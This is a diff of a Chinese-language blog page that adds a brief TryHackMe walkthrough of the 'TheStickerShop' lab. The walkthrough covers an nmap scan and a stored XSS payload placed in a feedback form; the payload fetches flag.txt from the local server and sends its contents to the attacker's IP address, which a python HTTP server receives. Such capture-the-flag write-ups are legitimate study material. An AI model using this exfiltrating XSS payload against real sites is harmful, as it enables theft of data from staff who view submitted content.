@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>Archives | jujub3</title>
+    <title>TheStickerShop | jujub3</title>
     <meta name="author" content="jujub3" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -37,6 +37,10 @@
 
 
 <script src="/js/lib/preview.js"></script>
+
+
+
+
 
 
 
@@ -150,113 +154,67 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>TheStickerShop</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/4/1
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
             
-<div id="archives">
-    
-    <div id="timeline-wrap" ref="timeline">
-        
-        <div class="timeline" data-title="brains">
-            <div class="timeline-tail"></div>
-            <div class="timeline-content">
-                <div class="item-time">2025/3/31</div>
-                <a href="/2025/03/31/brains/">
-                    <h3>brains</h3>
+            
+            <span class="tag">
+                
+                <a href="/tags/THM/" style="color: #00a596">
+                    THM
                 </a>
-                <div class="info">
-                    
-                    
-                    <span class="tags">
-                        <span class="icon">
-                            <i class="fa-solid fa-tags fa-fw"></i>
-                        </span>
-                        
-                        
-                        <span class="tag">
-                            
-                            <a href="/tags/THM/" style="color: #ffa2c4">
-                                THM
-                            </a>
-                        </span>
-                        
-                    </span>
-                    
-                </div>
-            </div>
-        </div>
-        
-        <div class="timeline" data-title="lo-fi">
-            <div class="timeline-tail"></div>
-            <div class="timeline-content">
-                <div class="item-time">2025/3/31</div>
-                <a href="/2025/03/31/Lo-Fi/">
-                    <h3>Lo-Fi</h3>
-                </a>
-                <div class="info">
-                    
-                    
-                    <span class="tags">
-                        <span class="icon">
-                            <i class="fa-solid fa-tags fa-fw"></i>
-                        </span>
-                        
-                        
-                        <span class="tag">
-                            
-                            <a href="/tags/THM/" style="color: #03a9f4">
-                                THM
-                            </a>
-                        </span>
-                        
-                    </span>
-                    
-                </div>
-            </div>
-        </div>
-        
-        <div class="timeline" data-title="platter">
-            <div class="timeline-tail"></div>
-            <div class="timeline-content">
-                <div class="item-time">2025/4/1</div>
-                <a href="/2025/04/01/Platter/">
-                    <h3>Platter</h3>
-                </a>
-                <div class="info">
-                    
-                    
-                </div>
-            </div>
-        </div>
-        
-        <div class="timeline" data-title="thestickershop">
-            <div class="timeline-tail"></div>
-            <div class="timeline-content">
-                <div class="item-time">2025/4/1</div>
-                <a href="/2025/04/01/TheStickerShop/">
-                    <h3>TheStickerShop</h3>
-                </a>
-                <div class="info">
-                    
-                    
-                    <span class="tags">
-                        <span class="icon">
-                            <i class="fa-solid fa-tags fa-fw"></i>
-                        </span>
-                        
-                        
-                        <span class="tag">
-                            
-                            <a href="/tags/THM/" style="color: #ffa2c4">
-                                THM
-                            </a>
-                        </span>
-                        
-                    </span>
-                    
-                </div>
-            </div>
-        </div>
+            </span>
+            
+        </span>
         
     </div>
+    
+    <div class="content" v-pre>
+        <p>ad</p>
+<p>nmap进行扫描：</p>
+<p>![屏幕截图 2025-04-01 152515](..&#x2F;TheStickerShop&#x2F;屏幕截图 2025-04-01 152515.png)</p>
+<p>发现开放了一个8080端口，其他端口都有防火墙。然后访问发现是一个页面，有个feedback，这里注意到短期时间内会有员工来看，就提供了xss攻击的条件。</p>
+<pre><code class="language-js">&lt;script&gt;
+fetch(&#39;http://127.0.0.1:8080/flag.txt&#39;)
+  .then(response =&gt; response.text())
+  .then(data =&gt; &#123;
+    fetch(&#39;http://10.17.33.100/?data=&#39; + encodeURIComponent(data))
+  &#125;)
+&lt;/script&gt;
+</code></pre>
+<p>![屏幕截图 2025-04-01 152611](..&#x2F;TheStickerShop&#x2F;屏幕截图 2025-04-01 152611.png)</p>
+<p>开启python服务：</p>
+<p>sudo python3 -m http.server 80</p>
+<p>然后执行js代码，让目标机器把flag.txt给带出来。</p>
+<p>![屏幕截图 2025-04-01 152855](..&#x2F;TheStickerShop&#x2F;屏幕截图 2025-04-01 152855.png)</p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
 </div>
 
             <footer id="footer">
@@ -287,6 +245,29 @@
         
     </div>
     <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="jujub3/jujub3.github.io"
+    data-repo-id="R_kgDOOQ-ONw"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOOQ-ON84ComAd"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
     
 </body>
 </html>
